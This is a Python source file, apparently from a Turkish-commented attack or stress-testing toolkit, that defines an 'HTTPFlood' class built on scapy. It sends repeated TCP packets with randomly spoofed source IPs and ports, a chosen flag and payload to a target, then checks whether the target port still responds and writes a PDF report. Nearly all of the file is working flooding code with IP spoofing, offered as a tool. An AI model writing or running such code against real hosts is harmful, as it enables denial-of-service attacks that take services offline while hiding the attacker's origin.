# -*- coding: utf-8 -*-

from scapy.all import *
import socket
import sys,os
import time


def SpoofIP():
	return "%s.%s.%s.%s" %(random.randint(1,255),random.randint(1, 255),random.randint(1, 255),random.randint(1, 255))

def SpoofPort():
	return random.randint(10000,65535)

def isAlive(dst,port):
	s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
	try:
		s.connect((dst,int(port) ) )
		return "{} {} is open".format(dst, port)
	except socket.error as e:
		return "{} {} is not open".format(dst, port)


class HTTPFlood():
	def __init__(self,dst,port,flag,payload,count):
		#View'den gelen degiskenlerin atamaları yapılıyor
		self.dst ,self.port , self.flag ,self.payload ,self.count = \
			dst ,port , flag ,payload, count

		if str(self.dst).startswith("http"):
			#[:-1] -> burada çoğu linkte olan / kaldırmak için kullandım
			tmp = str(self.dst).split("/")[2]
			self.dst = socket.gethostbyname(tmp)

	def Start(self):
		for i in range(int(self.count)):
			self.Attack()

		# isAlive fonksiyonu çalıştırılarak hedefin live olup olmadığı bilgisi dönüyor
		hold = isAlive(self.dst, self.port)

		sys.path.append(os.path.join("Manage/Scripts/PDF/"))
		from createPDF import *
		CreatePDF("Http Flood",hold)


	def Attack(self):
		src_ip = SpoofIP()
		src_port = SpoofPort()
		network_layer = IP(src=src_ip, dst=self.dst)
		transport_layer = TCP(sport=int(src_port), dport=int(self.port), flags=str(self.flag))
		send(network_layer / transport_layer / Raw(load=self.payload), verbose=False)
